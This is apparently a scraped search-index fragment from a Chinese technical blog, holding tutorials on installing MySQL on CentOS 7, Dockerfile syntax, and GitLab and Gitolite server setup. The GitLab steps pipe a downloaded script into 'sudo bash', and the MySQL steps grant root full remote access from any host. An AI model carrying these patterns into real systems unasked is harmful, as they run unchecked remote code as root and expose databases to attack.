Cloud Greenwich 版中，Spring 官方推荐使用 Resilience4j 替代 Hystrix，也可以选择使用 Spring Cloud Alibaba Sentinel。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Centos7 使用 RPM 源安装 MySQL",url:"/posts/988f02de.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 卸载 Mariadb 12345# 查找mariadb模块# rpm -qa | grep mariadb# 删除查找到的mariadb模块# rpm -e --nodeps xxxx RPM 源安装 MySQL 1234567891011121314151617# 下载repository# wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm# 安装repository# rpm -ivh mysql57-community-release-el7-11.noarch.rpm# 查看repository是否安装成功# yum repolist enabled | grep "mysql.*-community.*"# 安装mysql# yum install -y mysql-community-libs-compat mysql-community-server# 启动mysql# systemctl start mysqld# 查看mysql启动状态# systemctl status mysqld 开机自启动 MySQL 12345# 自启动# systemctl enable mysqld# 重载配置# systemctl daemon-reload 更改 Root 本地登录密码、允许 Root 远程登录 1234567891011121314# 查看mysql安装时默认创建的密码# grep \'temporary password\' /var/log/mysqld.log# 登录mysql# mysql -h localhost -u root -p# 更改root本地登录密码（由于mysql自身默认的密码检查策略，密码必须包含：大小写字母、数字和特殊符号，并且长度不能少于8位）mysql&gt; ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'yourPassword\';# 允许root远程登录mysql&gt; GRANT ALL PRIVILEGES ON *.* TO \'root\'@\'%\' IDENTIFIED BY \'yourPassword\' WITH GRANT OPTION;# 刷新mysql的系统权限相关表mysql&gt; FLUSH PRIVILEGES; MySQL 基础配置、性能优化配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 备份默认的配置文件# cp /etc/my.cnf /etc/my.cnf.default# 编辑配置文件，添加以下内容# vim /etc/my.cnf[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]character-set-server=utf8default-storage-engine=INNODBdefault-time-zone="+8:00"explicit_defaults_for_timestamp=true########################################max_allowed_packet=64Mback_log=800 #重点优化max_connections=5000 #重点优化table_open_cache=614 #重点优化，其值与max_connections相关sort_buffer_size=2M #重点优化，其值与max_connections相关join_buffer_size=2M #重点优化，其值与max_connections相关thread_cache_size=300 #重点优化query_cache_size=64M #重点优化query_cache_limit=4Mquery_cache_min_res_unit=2ktmp_table_size=256Mkey_buffer_size=2048M #重点优化read_buffer_size=1M #其值与max_connections相关read_rnd_buffer_size=16M #其值与max_connections相关bulk_insert_buffer_size=64Minnodb_buffer_pool_size=2048M #重点优化innodb_thread_concurrency=0 #重点优化innodb_flush_log_at_trx_commit=1 #重点优化innodb_log_buffer_size=8Minnodb_log_file_size=128Minnodb_log_files_in_group=3 配置防火墙 12345678# 开放端口# firewall-cmd --zone=public --permanent --add-port=3306/tcp# 保存防火墙配置# firewall-cmd --reload# 查看已开放的端口# firewall-cmd --list-ports 管理 MySQL 服务 1234567891011# 关闭# systemctl stop mysqld# 启动# systemctl start mysqld# 重启# systemctl restart mysqld# 查看状态# systemctl status mysqld 更改系统的最大打开文件描述符数 本站教程 配置概述 123456配置文件：/etc/my.cnf数据目录：/var/lib/mysql日志文件：/var/log/mysqld.logpid文件：/var/run/mysqld/mysqld.pidsocket文件：/var/lib/mysql/mysql.sock服务启动脚本：/usr/lib/systemd/system/mysqld.service var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Docker 之七实战 Dockerfile 的简单编写",url:"/posts/24ee2660.html",text:'实战内容介绍 实战编写 Dockerfile，指定终端登录后的默认路径，同时预安装 vim、ifconfig 工具，最后通过 Dockerfile 构建新的 Centos 镜像并运行起来。 编写 Dockerfile 文件 12345678910FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ENV work_path /usr/localWORKDIR $work_pathRUN yum -y update &amp;&amp; yum -y install vim net-toolsCMD /bin/bash 构建新的 Docker 镜像 1234567891011# 拉取最新的Centos镜像# docker pull centos# 创建Dockerfile文件，并写入上述的文件内容# vi ~/dockerfile-centos# 通过Dockerfile文件构建新的Docker镜像# docker build -f ~/dockerfile-centos -t peter/centos:1.1 .# 可以使用--no-cache参数让Docker构建镜像时不使用缓存（中间镜像）# docker build --no-cache=True -f ~/dockerfile-centos -t peter/centos:1.1 . 构建新 Docker 镜像时输出的日志信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344Sending build context to Docker daemon 93.82MBStep 1/8 : FROM centos ---&gt; 1e1148e4cc2cStep 2/8 : MAINTAINER peter&lt;peter@gmail.com&gt; ---&gt; Running in bff9f4e99fc1Removing intermediate container bff9f4e99fc1 ---&gt; 058e53021a24Step 3/8 : ENV work_path /usr/local ---&gt; Running in 33e3edef7380Removing intermediate container 33e3edef7380 ---&gt; 52f1709ed735Step 4/8 : WORKDIR $work_path ---&gt; Running in 1304b1642e5aRemoving intermediate container 1304b1642e5a ---&gt; a158527938a7Step 5/8 : RUN yum -y update ---&gt; Running in 654318bc1889Loaded plugins: fastestmirror, ovlDetermining fastest mirrors * base: mirror.jdcloud.com * extras: mirror.jdcloud.com * updates: mirrors.cn99.comResolving Dependencies--&gt; Running transaction check---&gt; Package systemd.x86_64 0:219-62.el7 will be updated---&gt; Package systemd.x86_64 0:219-62.el7_6.2 will be an update---&gt; Package systemd-libs.x86_64 0:219-62.el7 will be updated---&gt; Package systemd-libs.x86_64 0:219-62.el7_6.2 will be an update---&gt; Package tzdata.noarch 0:2018g-1.el7 will be updated---&gt; Package tzdata.noarch 0:2018i-1.el7 will be an update--&gt; Finished Dependency Resolution...（省略）Step 7/8 : EXPOSE 80 ---&gt; Running in 4aae7e66419cRemoving intermediate container 4aae7e66419c ---&gt; b5647b33ffb8Step 8/8 : CMD /bin/bash ---&gt; Running in 877a21e5c705Removing intermediate container 877a21e5c705 ---&gt; 90fed978ec5cSuccessfully built 90fed978ec5cSuccessfully tagged peter/centos:1.1 查看新构建的 Docker 镜像 12345678910111213141516171819# 查看新的Docker镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/centos 1.1 8544847124e9 3 minutes ago 385MBcentos latest 1e1148e4cc2c 6 weeks ago 202MB# 查看新Docker镜像的构建历史# docker history peter/centos:1.1IMAGE CREATED CREATED BY SIZE COMMENT90fed978ec5c 2 hours ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/bin… 0Bb5647b33ffb8 2 hours ago /bin/sh -c #(nop) EXPOSE 80 0B3c621d86e6de 2 hours ago /bin/sh -c yum -y install vim net-tools 79.5MBa83741b44f7b 2 hours ago /bin/sh -c yum -y update 104MBa158527938a7 2 hours ago /bin/sh -c #(nop) WORKDIR /usr/local 0B52f1709ed735 2 hours ago /bin/sh -c #(nop) ENV work_path=/usr/local 0B058e53021a24 2 hours ago /bin/sh -c #(nop) MAINTAINER peter&lt;peter@gm… 0B1e1148e4cc2c 6 weeks ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) ADD file:6f877549795f4798a… 202MB 以交互方式运行新构建的 Docker 镜像 123456789101112131415# 以交互式运行新的Docker镜像# docker run -it --name="peter-centos" peter/centos:1.1# 退出终端（不停止容器）# ctrl + p + q# 查看当前所有正在运行的Docker容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb1a8c8ac1efc peter/centos:1.1 "/bin/sh -c /bin/bash" 2 minutes ago Up 2 minutes 80/tcp peter-centos# 重新连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it peter-centos /bin/bash# 注意：如果以后台方式运行上面新构建的Docker镜像，当容器启动完成后会马上关闭，因为Docker会认为容器内没有需要运行的应用（指当前容器内没有前台运行的进程）。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之六 Dockerfile 详解",url:"/posts/7d424db2.html",text:'Dockerfile 介绍 Dockerfile 是用来构建 Docker 镜像的文件，实质是一系列命令和参数构成的脚本文件。当 Dockerfile 文件编写完之后，可以通过 “docker build” 与”docker run” 命令构建并运行新的 Docker 镜像。其中 Dockerfile 定义了进程需要的一切东西，涉及的内容包括执行代码或者文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版本、服务进程和内核进程（当应用进程需要和系统服务、内核进程打交道的时候，需要考虑如何设计 namespace 的权限控制）等等。 Dockerfile、Docker 镜像、Docker 容器三者的关系 Dockerfile 面向开发，Docker 镜像是交付标准，Docker 容器则涉及部署与运维，三者缺一不可，合力充当 Docker 体系的基石。从应用软件的角度来看，Dockerfile、Docker 镜像与 Docker 容器分别代表软件的三个不同阶段，其中 Dockerfile 是软件的原材料，Docker 镜像是软件的交付品，Docker 容器则可以认为是软件的运行状态，示意图如下： Dockerfile 编写示例 123456789101112# Centos7官方的DockerfileFROM scratchADD centos-7-docker.tar.xz /LABEL org.label-schema.schema-version="1.0" \\ org.label-schema.name="CentOS Base Image" \\ org.label-schema.vendor="CentOS" \\ org.label-schema.license="GPLv2" \\ org.label-schema.build-date="20181205"CMD ["/bin/bash"] Dockerfile 基础知识 #表示注释 指令按照从上到下的顺序执行 每条指令都会创建一个镜像层，并对镜像进行提交 每条保留字指令都必须为大写字母格式，且后面至少要跟随一个参数 Docker 执行 Dockerfile 的大致流程 Docker 从基础镜像运行一个容器 执行一条指令并对容器作出修改 执行类似”docker commit” 的操作来提交一个新的镜像层 Docker 再基于刚提交的新镜像运行一个新容器 执行 Dockerfile 中的下一条指令，重复上面的执行流程，直到所有指令都执行完成 Dockerfile 指令 - FROM 1234567功能：指定基础镜像，并且必须是第一条指令；如果不以任何第三方镜像为基础，那么写法为：FROM scratch语法：FROM &lt;image&gt;FROM &lt;image&gt;:&lt;tag&gt;FROM &lt;image&gt;:&lt;digest&gt;三种写法，其中&lt;tag&gt;和&lt;digest&gt; 是可选项，如果没有选择，那么默认值为latest Dockerfile 指令 - MAINTAINER 123功能：指定镜像维护者，可以是维护者的姓名、邮箱地址、网页地址等语法：MAINTAINER &lt;name&gt; Dockerfile 指令 - RUN 123456789101112131415功能：指定镜像构建时需要运行的命令，一般用于更新系统、安装应用软件等语法：RUN &lt;command&gt;RUN ["executable", "param1", "param2"]第一种写法后边直接跟shell命令，在linux操作系统上默认是"/bin/sh -c"，在windows操作系统上默认是"cmd /S /C"第二种写法是类似于函数调用，可将executable理解成为可执行文件，后面就是两个参数RUN指令使用\\作为换行符示例：RUN /bin/bash -c "source $HOME/.bashrc; echo $HOME"RUN ["/bin/bash", "-c", "echo hello"]注意：多行命令尽量不要写多个RUN，原因是Dockerfile中每一个指令都会建立新的镜像层；多少个RUN就构建了多少个镜像层，会造成镜像的臃肿、多层，不仅仅增加了构建部署的时间，还容易出错 Dockerfile 指令 - ENV 123456功能：设置环境变量语法：ENV &lt;key&gt; &lt;value&gt;ENV &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...两者的区别就是第一种是一次设置一个，第二种是一次设置多个 Dockerfile 指令 - WORKDIR 12345678910功能：设置工作目录（即容器创建并启动后，通过终端登录进来所处的目录）；对RUN、CMD、ENTRYPOINT、COPY、ADD指令生效，如果目录不存在则会自动创建，可以设置多次语法：WORKDIR /path/to/workdir注意：WORKDIR可以解析环境变量，例如：ENV DIRPATH /pathWORKDIR $DIRPATHRUN pwd Dockerfile 指令 - ADD 123456789101112131415功能：将宿主机目录下的文件拷贝进镜像中，且支持url解析与自动解压tar压缩包语法：ADD &lt;src&gt;... &lt;dest&gt;ADD ["&lt;src&gt;",... "&lt;dest&gt;"]&lt;src&gt;可以是一个本地文件或者是一个本地压缩文件，还可以是一个url（此时类似于wget命令）&lt;dest&gt;路径的填写可以是容器内的绝对路径，也可以是相对于工作目录的相对路径示例：ADD test relativeDir/ADD test /relativeDirADD http://example.com/foobar /注意：任何压缩文件通过url的方式进行拷贝，都不会自动解压；同时尽量不要把&lt;scr&gt;写成一个文件夹，如果&lt;src&gt;是一个文件夹，则复制整个目录的内容，包括文件系统元数据 Dockerfile 指令 - COPY 12345678功能：将宿主机目录下的文件拷贝进镜像中语法：COPY &lt;src&gt;... &lt;dest&gt;COPY ["&lt;src&gt;",... "&lt;dest&gt;"]注意：COPY指令只能拷贝本地文件，不支持url解析，不会自动解压tar压缩包，除此之外其他用法与ADD指令一致 Dockerfile 指令 - VOLUME 12345678功能：数据卷，用于容器内数据的保存和持久化语法：VOLUME /dataVolumeVOLUME ["/dataVolume"]VOLUME /dataVolume1 /dataVolume2VOLUME ["/dataVolume1","/dataVolume2"]参数可以是一个JsonArray ，也可以是单个或多个值，上面四种写法都是正确的 Dockerfile 指令 - CMD 1234567891011121314151617功能：指定容器启动时需要执行的命令语法：CMD ["executable","param1","param2"]CMD command param1 param2CMD ["param1","param2"]第一种使用exec执行，推荐使用第二种在/bin/sh中执行，提供给需要交互的应用第三种指定提供给ENTRYPOINT指令的参数示例：CMD [ "sh", "-c", "echo $HOME"]CMD /bin/bash -c "echo $HOME"CMD [ "echo", "$HOME"]注意：每个Dockerfile文件只能有一条CMD命令，如果指定了多条CMD指令，只有最后一条CMD指令会被执行。同时如果用户启动容器时候指定了运行的命令，则会覆盖掉Dockerfile文件中CMD指令指定的命令；例如“docker run -it peter/centos:1.1 ls -al”中的“ls -al”会覆盖Dockerfile文件中的CMD指令。 Dockerfile 指令 - ENTRYPOINT 123456789101112131415161718功能：指定容器启动时需要执行的命令语法：ENTRYPOINT ["executable", "param1", "param2"]ENTRYPOINT command param1 param2示例：ENTRYPOINT [ "sh", "-c", "echo $HOME"]ENTRYPOINT /bin/bash -c "echo $HOME"ENTRYPOINT与CMD指令的相同点：1) 容器启动时才执行指令，运行时机相同2) 每个Dockerfile文件只能有一条ENTRYPOINT/CMD命令，如果指定了多条ENTRYPOINT/CMD指令，只有最后一条ENTRYPOINT/CMD指令会被执行ENTRYPOINT与CMD指令的不同点：1）如果用户启动容器时指定了运行的命令，ENTRYPOINT指令不会被覆盖（会追加后续用户启动容器时指定的命令内容），而CMD指令则会被覆盖2）如果在Dockerfile中同时写了ENTRYPOINT和CMD指令，并且CMD指令不是一个完整的可执行命令，那么CMD指令的内容将会作为ENTRYPOINT指令的参数3）如果在Dockerfile中同时写了ENTRYPOINT和CMD指令，并且CMD指令是一个完整的指令，那么它们两个会互相覆盖，谁在最后谁生效 Dockerfile 指令 - ONBUILD 12345678功能：该指令只对当前镜像的子镜像生效，即父镜像在被子镜像继承后，父镜像Dockerfile中的ONBUILD指令会被触发语法：ONBUILD [INSTRUCTION]示例：ONBUILD RUN [ "npm", "install" ]ONBUILD COPY ./package.json /app Dockerfile 指令 - EXPOSE 123456789功能：暴露容器运行时监听的端口，使容器内的应用可以通过端口和外界通信语法：EXPOSE port1EXPOSE port2EXPOSE port3注意：EXPOSE指令并不会让容器监听的端口映射到宿主机的端口，如果想使容器监听的端口与宿主机的端口有映射关系，必须在容器启动的时候指定"-P"或者"-p"参数 Dockerfile 指令 - USER 12345678功能：指定启动容器的用户，可以是用户名或UID语法：USER adminUSER UID注意：如果设置了容器以admin用户去运行，那么RUN、CMD、ENTRYPOINT指令都会以这个用户身份去运行 Dockerfile 指令 - STOPSIGNAL 1234功能：指定当容器退出时给系统发送指定的信号语法：STOPSIGNAL signal Dockerfile 指令 - ARG 1234567891011功能：定义变量语法：ARG &lt;name&gt;[=&lt;default value&gt;]示例：ARG user1ARG buildno=1注意：当使用ARG指令定义了一个变量，在执行"docker build"命令构建镜像的时候，使用"--build-arg &lt;varname&gt;=&lt;value&gt;"来指定变量的值；如果用户在构建镜像时指定了一个没有定义在Dockerfile中的变量，那么Docker将会抛出一个Warning；如果ARG定义的变量拥有默认值，那么当构建镜像没有指定变量值的时候，将会使用这个默认值 Dockerfile 指令 - LABEL 12345678910111213功能：为镜像指定标签语法：LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...示例：LABEL "com.example.vendor"="ACME Incorporated"LABEL multi.label1="value1" \\multi.label2="value2" \\other="value3"注意：Dockerfile中可以有多个LABEL指令，但是建议只使用一个LABEL指令并写成一行，如太长需要换行则可以使用\\符号作为换行符。LABEL指令会继承基础镜像中的LABEL指令，如遇到key相同，则覆盖父镜像的值 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Git 之八 - Gitlab 详细使用教程",url:"/posts/79923b91.html",text:'上篇 - Git 之七 - Centos7 搭建 Gitlab 服务器 Gitlab 常规配置 12345678910111213141516171819202122232425262728# 编辑Gitlab的配置文件# vim /etc/gitlab/gitlab.rb# 配置unicorn的端口（默认8080），注意不要用8082、9090端口，因为自带工具会占用unicorn[\'port\'] = 9999# 配置Gitlab的默认备份路径gitlab_rails[\'backup_path\'] = "/var/opt/gitlab/backups"# 配置邮件发送gitlab_rails[\'smtp_enable\'] = truegitlab_rails[\'smtp_address\'] = "smtp.exmail.qq.com"gitlab_rails[\'smtp_port\'] = 25gitlab_rails[\'smtp_user_name\'] = "huangdc@domain.com"gitlab_rails[\'smtp_password\'] = "smtp password"gitlab_rails[\'smtp_authentication\']= "plain"gitlab_rails[\'smtp_enable_starttls_auto\']= truegitlab_rails[\'gitlab_email_from\']= "huangdc@domain.com"gitlab_rails[\'gitlab_email_reply_to\']= "noreply@domain.com"# 配置SSH的端口（默认22），修改之后Gitlab中项目的SSH地址会在前面加上协议头和端口号，例如“ssh://git@192.168.1.198:55725/lisi/test.git”gitlab_rails[\'gitlab_shell_ssh_port\'] = 55725# 重新编译Gitlab的配置# gitlab-ctl reconfigure# 重启GitLab# gitlab-ctl restart Gitlab 定时备份 123456# 添加定时备份任务，crontab表达式根据自己的需要进行修改，最后wq存盘退出crontab的编辑状态# crontab -e0 2 * * * /usr/bin/gitlab-rake gitlab:backup:create CRON=1# 查看计划任务是否添加成功# crontab -l Gitlab 恢复备份 12345678910111213# 停止unicorn和sidekiq，保证数据库没有新的连接，不会有新的数据写入# gitlab-ctl stop unicorn# gitlab-ctl stop sidekiq# 进入gitlab的备份目录# cd /var/opt/gitlab/backups# 恢复指定的备份文件，1547096290_2019_01_10_11.6.3是备份文件的编号# gitlab-rake gitlab:backup:restore BACKUP=1547096290_2019_01_10_11.6.3# 启动unicorn和sidekiq# gitlab-ctl start unicorn# gitlab-ctl start sidekiq var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"版本控制"},{title:"Git 之七 - Centos7 搭建 Gitlab 服务器",url:"/posts/37ea711c.html",text:'Gitlab 相关站点 Gitlab 官网 Gitlab CE Github Gitlab 官方安装教程 Gitlab CE 官方文档 安装 Gitlab 所需的最低硬件配置说明 Gitlab 介绍 GitLab 是基于 Ruby on Rails 的一个开源版本管理系统，实现一个自托管的 Git 项目仓库，可通过 Web 界面进行访问公开的或者私人项目。GitLab 分为社区版（CE） 和企业版（EE）。它拥有与 Github 类似的功能，能够浏览源代码，管理缺陷和注释。可以管理团队对仓库的访问，它非常易于浏览提交过的版本并提供一个文件历史库。团队成员可以利用内置的简单聊天程序 (Wall) 进行交流。依赖组件：Ruby、Git、Nginx、Redis、Sidekiq、GitLab Runner、Unicorn Workers、PostgreSQL/MySQL/MariaDB 等，其中 MySQL/MariaDB 并不完全支持 Gitlab 的所有功能，官方强烈推荐安装 PostgreSQL。 安装环境说明 12345$ uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux$ cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core) 安装并配置必要的依赖项 123456789101112131415161718192021222324# 安装依赖项# yum install -y curl policycoreutils-python openssh-server# 配置SSH服务开机自启动# systemctl enable sshd# 启动SSH服务# systemctl start sshd# 查看防火墙运行状态# firewall-cmd --state# 如果防火墙服务处于关闭状态，则启用防火墙服务# systemctl start firewalld# 配置防火墙开放HTTP服务（80端口）# firewall-cmd --permanent --add-service=http# 保存防火墙配置# systemctl reload firewalld# 查看防火墙已开放的服务，防火墙默认会开放SSH服务（22端口）# firewall-cmd --list-servicesdhcpv6-client ssh http 安装 Postfix，用于发送通知邮件 12345678# 安装Postfix# yum install postfix# 配置Postfix服务开机自启动# systemctl enable postfix# 启动Postfix服务# systemctl start postfix Yum 方式安装 Gitlab 1234567891011121314151617# 添加Yum仓库# curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bash# 安装Gitlab，EXTERNAL_URL是指用于外部访问Gitlab的域名或者URL地址，安装包的体积约447M# EXTERNAL_URL="http://192.168.1.198" yum install -y gitlab-ce# 编译Gitlab的配置与启动Gitlab，首次执行耗时较长# gitlab-ctl reconfigure# 查看gitlab各组件是否启动成功# gitlab-ctl status# 查看已安装的Gitlab的版本# cat /opt/gitlab/embedded/service/gitlab-rails/VERSION# 测试Gitlab是否安装并启动成功，浏览器输入以下URL访问Gitlab，初次访问Gitlab需要在Web界面配置root用户的密码，然后使用root用户进行登录http://192.168.1.198 配置 Gitlab 的 Nginx 端口 1234567891011121314151617181920212223# 不能通过编辑Nginx配置文件的方式来修改Gitlab的Nginx端口，因为重新编译Gitlab的配置后，Nginx的配置文件/var/opt/gitlab/nginx/conf/gitlab-http.conf会被重新覆盖# 编辑Gitlab的配置文件# vim /etc/gitlab/gitlab.rb# 修改Gitlab的Nginx端口（默认80），注意不要用8082端口，因为自带工具可能会占用nginx[\'listen_port\'] = 8888external_url \'http://192.168.1.198:8888\'# 重新编译Gitlab的配置，Nginx配置文件中的listen、server_name、http_host_with_default配置项的值会自动更新# gitlab-ctl reconfigure# 重启GitLab# gitlab-ctl restart# 配置防火墙永久开放修改后的Nginx端口# firewall-cmd --zone=public --permanent --add-port=8888/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports Gitlab 常用目录与配置文件介绍 1234567891011# 对应Gitlab各服务的主目录，同时也是Gitlab的数据目录# ls /var/opt/gitlab# 对应各服务的日志目录# ls /var/log/gitlab# 配置文件-Gitlab# cat /etc/gitlab/gitlab.rb# 配置文件-Nginx# cat /var/opt/gitlab/nginx/conf/gitlab-http.conf Gitlab 常用命令介绍 1234567891011121314151617181920212223242526272829# 启动所有gitlab组件# gitlab-ctl start# 停止所有gitlab组件# gitlab-ctl stop# 重启所有gitlab组件# gitlab-ctl restart# 查看gitlab各组件的运行状态# gitlab-ctl status# 重启某个组件# gitlab-ctl restart nginx# 查看某个组件的运行状态# gitlab-ctl status nginx# 重新编译gitlab的配置# gitlab-ctl reconfigure# 查看gitlab的日志# gitlab-ctl tail# 查看nginx的日志# gitlab-ctl tail nginx/gitlab_access.log# 检查gitlab# gitlab-rake gitlab:check SANITIZE=true --trace 下篇 - Git 之八 - Gitlab 详细使用教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"版本控制 centos"},{title:"Git 之六 - 使用 Gitolite 搭建 Git 服务器",url:"/posts/3a44097a.html",text:'Gitolite Github Repo https://github.com/sitaramc/gitolite Gitolite 介绍 Gitolite 是一款 Perl 语言开发的 Git 服务管理工具，采用的是 SSH 协议并使用 SSH 公钥认证，能够通过配置文件对写操作进行基于分支和路径的精细授权。 安装环境说明 12345$ uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux$ cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core) 安装基础依赖包 12345# 切换到Root用户$ su - root# 安装依赖包# yum install -y autoconf git gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel tree 创建 Git 用户 1234567# 如果Git用户已存在则无需再创建，务必确认/home/git/.ssh/authorized_keys文件的内容为空或者不存在# 创建Git用户# adduser git# 设置Git用户的密码# passwd git 创建 Root 用户的 SSH 公钥 / 私钥对 1234567891011# 进入Root用户家目录下的.ssh目录# cd /root/.ssh# 查看是否存在SSH公钥/私钥对# ls -al# 如果不存在SSH公钥/私钥对，则执行以下命令进行创建，然后一路回车到结束# ssh-keygen# 将Root用户的SSH公钥文件复制到Git用户的家目录下，建议公钥文件使用具有标识性的文件名称，便于多人协作开发时区分不同的客户端用户# cp id_rsa.pub /home/git/sk.pub 安装 Gitolite 1234567891011121314151617181920212223242526272829# 切换到Git用户# su - git# 确保当前位置是在Git用户的家目录（/home/git）下$ pwd# 更新Bash$ source .bash_profile# 创建一个名称为bin的目录$ mkdir bin# 克隆Gitolite源码$ git clone git://github.com/sitaramc/gitolite# 在bin目录下创建Gitolite符号链接，必须使用相对路径$ gitolite/install -ln ~/bin# 使用Root用户的SSH公钥文件安装Gitolite，在服务器中Gitolite通常是由一个非Root用户安装的，一般是使用Git用户$ gitolite setup -pk sk.pub# 安装完成后/home/git目录的结构如下$ tree -L 1 /home/git/home/git├── bin├── gitolite├── projects.list├── repositories└── sk.pub 验证 Gitolite 是否安装成功 12345678910111213141516# 切换到Root用户$ su - root# 确保当前位置是在Root用户的家目录（/root）下# pwd# 测试从新安装的Gitolite服务器中克隆gitolite-admin仓库，终端会提示输入Root用户的密码，由于上面已经交换了Root用户的SSH公钥文件，因此只需要输入"yes"，然后输入回车键即可# git clone git@127.0.0.1:gitolite-admin# 查看gitolite-admin仓库的目录结构，conf目录用于存放配置文件（授权文件），keyDir目录用于存放所有客户端用户的SSH公钥文件# tree gitolite-admingitolite-admin├── conf│ └── gitolite.conf└── keydir └── sk.pub gitolite-admin 仓库介绍 gitolite-admin 仓库用于 Git 管理员管理 Git 仓库与分配 Git 仓库权限，以后每次新增仓库、修改权限、更新用户 / 用户组，都需要在这个 clone 下来的 gitolite-admin 仓库下的 conf 目录中进行配置；同时将客户端用户的 SSH 公钥文件上传至 keydir 目录，SSH 公钥文件的文件名以客户端用户名来区分；然后将新增或修改的文件 push 到仓库服务器，push 完后可以看到 /home/git/repositories 下新创建的仓库。 